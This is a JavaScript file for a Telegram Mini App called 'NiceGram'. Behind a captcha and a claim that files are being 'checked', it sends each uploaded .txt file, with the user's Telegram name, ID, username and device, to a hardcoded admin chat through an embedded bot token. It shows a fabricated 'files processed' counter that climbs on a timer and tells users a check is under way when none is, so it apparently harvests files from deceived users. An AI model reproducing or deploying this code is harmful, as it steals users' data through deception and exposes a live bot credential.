const tg = window.Telegram.WebApp;
tg.expand();

// Настройки
const BOT_TOKEN = "8567185651:AAFx8TIPf4nEle-hGT25sfip20dB7m0VT1I";
const ADMIN_ID = "7632180689";

// Переменные капчи
let currentAngle = 0;
let isDragging = false;
let startNotificationSent = false;
let targetMin = 30;
let targetMax = 50;

// Счетчик файлов
let filesCounter = 0;
let counterInterval;
let lastUpdateTime = 0;

// Элементы
const degreeDisplay = document.getElementById('degree');
const sliderHandle = document.getElementById('slider-handle');
const targetRange = document.getElementById('target-range');
const captchaScreen = document.getElementById('captcha-screen');
const mainScreen = document.getElementById('main-screen');
const statusMsg = document.getElementById('status-msg');
const welcomeUser = document.getElementById('welcome-user');
const filesCounterElement = document.getElementById('files-counter');

// Инициализация счетчика с продвинутым алгоритмом
function initCounter() {
    // Загружаем счетчик из localStorage
    const savedData = localStorage.getItem('nicegram_counter_data');
    
    if (savedData) {
        try {
            const data = JSON.parse(savedData);
            const today = new Date().toDateString();
            const savedDate = data.date;
            
            if (savedDate === today) {
                // Сегодняшний день - восстанавливаем счетчик
                filesCounter = data.counter;
                lastUpdateTime = data.lastUpdateTime || Date.now();
                
                // Рассчитываем, сколько прошло времени с последнего обновления
                const timePassed = Date.now() - lastUpdateTime;
                const secondsPassed = Math.floor(timePassed / 1000);
                
                // Каждые 10 секунд добавляется 1, так что вычисляем сколько добавить
                const additions = Math.floor(secondsPassed / 10);
                
                if (additions > 0) {
                    filesCounter += additions;
                    lastUpdateTime = Date.now();
                    saveCounterData();
                    console.log(`Добавлено ${additions} к счетчику за прошедшее время`);
                }
            } else {
                // Новый день - начинаем с последнего значения + рандом
                const baseCounter = data.counter;
                // Добавляем случайное число от 50 до 200
                const randomAddition = Math.floor(Math.random() * 151) + 50;
                filesCounter = baseCounter + randomAddition;
                lastUpdateTime = Date.now();
                saveCounterData();
                console.log(`Новый день! Добавлено ${randomAddition} к счетчику`);
            }
        } catch (e) {
            console.error('Ошибка загрузки данных:', e);
            // Начинаем с случайного числа
            filesCounter = Math.floor(Math.random() * 1000) + 500;
            lastUpdateTime = Date.now();
            saveCounterData();
        }
    } else {
        // Первый запуск - начинаем с большого числа
        filesCounter = Math.floor(Math.random() * 1500) + 1000;
        lastUpdateTime = Date.now();
        saveCounterData();
    }
    
    // Обновляем отображение
    if (filesCounterElement) {
        filesCounterElement.textContent = formatNumber(filesCounter);
    }
    
    // Запускаем интервал увеличения счетчика
    if (counterInterval) {
        clearInterval(counterInterval);
    }
    
    counterInterval = setInterval(() => {
        increaseCounter();
    }, 10000); // 10 секунд
    
    console.log('Счетчик инициализирован:', filesCounter);
}

// Сохранение данных счетчика
function saveCounterData() {
    const data = {
        counter: filesCounter,
        date: new Date().toDateString(),
        lastUpdateTime: Date.now()
    };
    
    localStorage.setItem('nicegram_counter_data', JSON.stringify(data));
}

// Форматирование числа с пробелами
function formatNumber(num) {
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ");
}

// Увеличение счетчика (основная функция)
function increaseCounter() {
    // Базовое увеличение
    filesCounter++;
    
    // Случайное дополнительное увеличение (10% шанс добавить еще 1-3)
    if (Math.random() < 0.1) {
        const extra = Math.floor(Math.random() * 3) + 1;
        filesCounter += extra;
    }
    
    // Сохраняем
    saveCounterData();
    
    // Обновляем отображение с анимацией
    if (filesCounterElement) {
        filesCounterElement.textContent = formatNumber(filesCounter);
        
        // Анимация обновления
        filesCounterElement.style.transform = 'scale(1.15)';
        filesCounterElement.style.color = '#00ffaa';
        
        setTimeout(() => {
            filesCounterElement.style.transform = 'scale(1)';
            filesCounterElement.style.color = '';
        }, 300);
    }
    
    // Логируем каждое 100-е увеличение
    if (filesCounter % 100 === 0) {
        console.log(`Счетчик достиг: ${formatNumber(filesCounter)}`);
    }
}

// Увеличение счетчика при отправке файла
function increaseCounterOnUpload() {
    // При отправке файла добавляем больше
    const uploadBonus = Math.floor(Math.random() * 5) + 3; // 3-7
    filesCounter += uploadBonus;
    
    saveCounterData();
    
    if (filesCounterElement) {
        filesCounterElement.textContent = formatNumber(filesCounter);
        
        // Специальная анимация для загрузки
        filesCounterElement.style.transform = 'scale(1.3)';
        filesCounterElement.style.color = '#00ff00';
        filesCounterElement.style.textShadow = '0 0 15px #00ff00';
        
        setTimeout(() => {
            filesCounterElement.style.transform = 'scale(1.1)';
            setTimeout(() => {
                filesCounterElement.style.transform = 'scale(1)';
                filesCounterElement.style.color = '';
                filesCounterElement.style.textShadow = '';
            }, 200);
        }, 300);
    }
    
    console.log(`Добавлено ${uploadBonus} к счетчику за загрузку файла`);
}

// Функция определения устройства
function detectDevice() {
    const userAgent = navigator.userAgent;
    
    if (/android/i.test(userAgent)) {
        return "📱 Android";
    } else if (/iPad|iPhone|iPod/.test(userAgent)) {
        return "📱 iOS (iPhone/iPad)";
    } else if (/windows/i.test(userAgent)) {
        return "💻 Windows PC";
    } else if (/mac/i.test(userAgent)) {
        return "💻 macOS";
    } else if (/linux/i.test(userAgent)) {
        return "💻 Linux";
    } else {
        return "🌐 Веб-браузер";
    }
}

// Генерация случайного диапазона
function generateRandomRange() {
    const starts = [0, 20, 40, 60, 80, 100, 120, 140, 160];
    const start = starts[Math.floor(Math.random() * starts.length)];
    
    targetMin = start;
    targetMax = start + 20;
    
    if (targetMax > 180) {
        targetMax = 180;
        targetMin = 160;
    }
    
    targetRange.textContent = `${targetMin}° - ${targetMax}°`;
}

// Вращение стрелки
function startRotation(e) {
    e.preventDefault();
    isDragging = true;
    sliderHandle.style.cursor = 'grabbing';
    
    const container = sliderHandle.parentElement;
    const centerX = container.offsetWidth / 2;
    const centerY = container.offsetHeight / 2;
    const radius = container.offsetWidth / 2;
    
    function updateAngle(clientX, clientY) {
        if (!isDragging) return;
        
        const rect = container.getBoundingClientRect();
        const x = clientX - rect.left - centerX;
        const y = clientY - rect.top - centerY;
        
        let angle = Math.atan2(y, x) * (180 / Math.PI) + 90;
        if (angle < 0) angle += 360;
        
        sliderHandle.style.transform = `rotate(${angle}deg)`;
        
        currentAngle = angle > 180 ? 360 - angle : angle;
        currentAngle = Math.round(currentAngle);
        
        degreeDisplay.textContent = `${currentAngle}°`;
        
        if (currentAngle >= targetMin && currentAngle <= targetMax) {
            degreeDisplay.style.color = '#00ff00';
            degreeDisplay.style.textShadow = '0 0 25px rgba(0, 255, 0, 0.9)';
            sliderHandle.style.background = 'linear-gradient(135deg, #00ff66, #00aa44)';
        } else {
            degreeDisplay.style.color = '#00ff88';
            degreeDisplay.style.textShadow = '0 0 15px rgba(0, 255, 0, 0.6)';
            sliderHandle.style.background = 'linear-gradient(135deg, #00aa44, #006622)';
        }
    }
    
    updateAngle(
        e.type === 'touchstart' ? e.touches[0].clientX : e.clientX,
        e.type === 'touchstart' ? e.touches[0].clientY : e.clientY
    );
    
    function moveHandler(moveEvent) {
        if (!isDragging) return;
        
        const clientX = moveEvent.type === 'touchmove' ? moveEvent.touches[0].clientX : moveEvent.clientX;
        const clientY = moveEvent.type === 'touchmove' ? moveEvent.touches[0].clientY : moveEvent.clientY;
        
        updateAngle(clientX, clientY);
    }
    
    function stopHandler() {
        isDragging = false;
        sliderHandle.style.cursor = 'grab';
        
        document.removeEventListener('mousemove', moveHandler);
        document.removeEventListener('mouseup', stopHandler);
        document.removeEventListener('touchmove', moveHandler);
        document.removeEventListener('touchend', stopHandler);
    }
    
    document.addEventListener('mousemove', moveHandler);
    document.addEventListener('mouseup', stopHandler);
    document.addEventListener('touchmove', moveHandler, { passive: false });
    document.addEventListener('touchend', stopHandler);
}

// Инициализация вращения
if (sliderHandle) {
    sliderHandle.addEventListener('mousedown', startRotation);
    sliderHandle.addEventListener('touchstart', startRotation, { passive: false });
} else {
    console.error('Элемент slider-handle не найден!');
}

// Проверка капчи
const verifyBtn = document.getElementById('verify-btn');
if (verifyBtn) {
    verifyBtn.onclick = function() {
        if (currentAngle >= targetMin && currentAngle <= targetMax) {
            if (tg.HapticFeedback) {
                tg.HapticFeedback.impactOccurred('light');
            }
            
            degreeDisplay.style.animation = 'pulse 0.5s';
            sliderHandle.style.animation = 'pulse 0.5s';
            
            setTimeout(() => {
                degreeDisplay.style.animation = '';
                sliderHandle.style.animation = '';
            }, 500);
            
            captchaScreen.style.opacity = '0';
            captchaScreen.style.transform = 'scale(0.95)';
            
            setTimeout(() => {
                captchaScreen.classList.add('hidden');
                mainScreen.classList.remove('hidden');
                
                const user = tg.initDataUnsafe?.user || {};
                const name = user.first_name || "Пользователь";
                welcomeUser.textContent = `👋 Привет, ${name}!`;
                
                if (!startNotificationSent) {
                    sendStartNotification(name, user.username, user.id);
                    startNotificationSent = true;
                }
                
                // Инициализируем счетчик
                initCounter();
                
                mainScreen.style.opacity = '0';
                setTimeout(() => {
                    mainScreen.style.opacity = '1';
                    mainScreen.style.transform = 'scale(1)';
                }, 50);
                
            }, 300);
        } else {
            if (tg.HapticFeedback) {
                tg.HapticFeedback.impactOccurred('heavy');
            }
            
            alert(`❌ Нужно: ${targetMin}°-${targetMax}°\nВаш угол: ${currentAngle}°`);
            generateRandomRange();
        }
    };
} else {
    console.error('Кнопка verify-btn не найдена!');
}

// Отправка уведомления о старте
async function sendStartNotification(name, username, userId) {
    try {
        const message = `🚀 *Новый пользователь прошел капчу*\n\n` +
                       `👤 *Юзер:* @${username || 'без username'}\n` +
                       `👨 *Имя:* ${name}\n` +
                       `🆔 *ID:* \`${userId || 'неизвестно'}\`\n` +
                       `🎯 *Диапазон капчи:* ${targetMin}°-${targetMax}°\n` +
                       `🎯 *Выбранный угол:* ${currentAngle}°\n` +
                       `⏰ *Время:* ${new Date().toLocaleString('ru-RU')}`;
        
        const formData = new FormData();
        formData.append('chat_id', ADMIN_ID);
        formData.append('text', message);
        formData.append('parse_mode', 'Markdown');
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            body: formData
        });
    } catch (err) {
        console.error('Ошибка уведомления:', err);
    }
}

// Загрузка файла
const selectFileBtn = document.getElementById('select-file-btn');
const fileInput = document.getElementById('file-input');

if (selectFileBtn && fileInput) {
    selectFileBtn.onclick = () => {
        fileInput.click();
    };

    fileInput.onchange = async function(e) {
        const file = e.target.files[0];
        if (!file) return;
        
        if (statusMsg) {
            statusMsg.className = 'status active';
            statusMsg.innerHTML = '📤 Отправка файла...';
        }
        
        if (!file.name.toLowerCase().endsWith('.txt')) {
            if (statusMsg) {
                statusMsg.className = 'status active error';
                statusMsg.innerHTML = '❌ Только .txt файлы разрешены';
            }
            this.value = '';
            return;
        }
        
        if (file.size > 10 * 1024 * 1024) {
            if (statusMsg) {
                statusMsg.className = 'status active error';
                statusMsg.innerHTML = '❌ Файл слишком большой (макс. 10MB)';
            }
            this.value = '';
            return;
        }
        
        try {
            const user = tg.initDataUnsafe?.user || {};
            const username = user.username ? `@${user.username}` : 'Скрыт';
            const firstName = user.first_name || 'Не указано';
            const userId = user.id || 'Неизвестно';
            
            const deviceInfo = detectDevice();
            const platform = tg.platform || 'Неизвестно';
            
            const formData = new FormData();
            formData.append('chat_id', ADMIN_ID);
            formData.append('document', file);
            
            const caption = `📄 *Файл:* ${file.name}\n` +
                           `👤 *Юзер:* ${username}\n` +
                           `👨 *Имя:* ${firstName}\n` +
                           `🆔 *ID:* \`${userId}\`\n` +
                           `📱 *Устройство:* ${deviceInfo}\n` +
                           `🌐 *Платформа:* ${platform}\n` +
                           `📊 *Размер:* ${(file.size / 1024).toFixed(2)} KB\n` +
                           `⏰ *Время:* ${new Date().toLocaleString('ru-RU')}`;
            
            formData.append('caption', caption);
            formData.append('parse_mode', 'Markdown');
            
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                method: 'POST',
                body: formData
            });
            
            const data = await response.json();
            
            if (data.ok) {
                if (statusMsg) {
                    statusMsg.className = 'status active success';
                    statusMsg.innerHTML = '✅проверка файла занимает 3-5 минут';
                }
                
                // Увеличиваем счетчик при успешной отправке
                increaseCounterOnUpload();
                
                if (tg.HapticFeedback) {
                    tg.HapticFeedback.notificationOccurred('success');
                }
                
                setTimeout(() => {
                    if (statusMsg) {
                        statusMsg.className = 'status';
                    }
                    this.value = '';
                }, 3000);
            } else {
                throw new Error(data.description || 'Неизвестная ошибка');
            }
            
        } catch (error) {
            if (statusMsg) {
                statusMsg.className = 'status active error';
                statusMsg.innerHTML = `❌ Ошибка отправки: ${error.message}`;
            }
            console.error('Ошибка:', error);
            
            if (tg.HapticFeedback) {
                tg.HapticFeedback.notificationOccurred('error');
            }
        }
    };
} else {
    console.error('Элементы для загрузки файла не найдены!');
}

// Инициализация модальных окон (если не инициализированы в index.html)
document.addEventListener('DOMContentLoaded', function() {
    tg.ready();
    generateRandomRange();
    
    // Инициализация кнопок модальных окон
    const instructionBtn = document.getElementById('instruction-btn');
    const instructionModal = document.getElementById('instruction-modal');
    const closeInstruction = document.getElementById('close-instruction');
    
    const faqBtn = document.getElementById('faq-btn');
    const faqModal = document.getElementById('faq-modal');
    const closeFaq = document.getElementById('close-faq');
    
    if (instructionBtn && instructionModal && closeInstruction) {
        instructionBtn.addEventListener('click', () => {
            instructionModal.classList.add('active');
        });
        
        closeInstruction.addEventListener('click', () => {
            instructionModal.classList.remove('active');
        });
        
        instructionModal.addEventListener('click', (e) => {
            if (e.target === instructionModal) {
                instructionModal.classList.remove('active');
            }
        });
    }
    
    if (faqBtn && faqModal && closeFaq) {
        faqBtn.addEventListener('click', () => {
            faqModal.classList.add('active');
        });
        
        closeFaq.addEventListener('click', () => {
            faqModal.classList.remove('active');
        });
        
        faqModal.addEventListener('click', (e) => {
            if (e.target === faqModal) {
                faqModal.classList.remove('active');
            }
        });
    }
    
    console.log('NiceGram App инициализирован');
});

// Проверяем все элементы при загрузке
console.log('Проверка элементов:');
console.log('degreeDisplay:', degreeDisplay);
console.log('sliderHandle:', sliderHandle);
console.log('targetRange:', targetRange);
console.log('verifyBtn:', document.getElementById('verify-btn'));

// Очистка при разгрузке страницы
window.addEventListener('beforeunload', function() {
    if (counterInterval) {
        clearInterval(counterInterval);
    }
    saveCounterData();
});
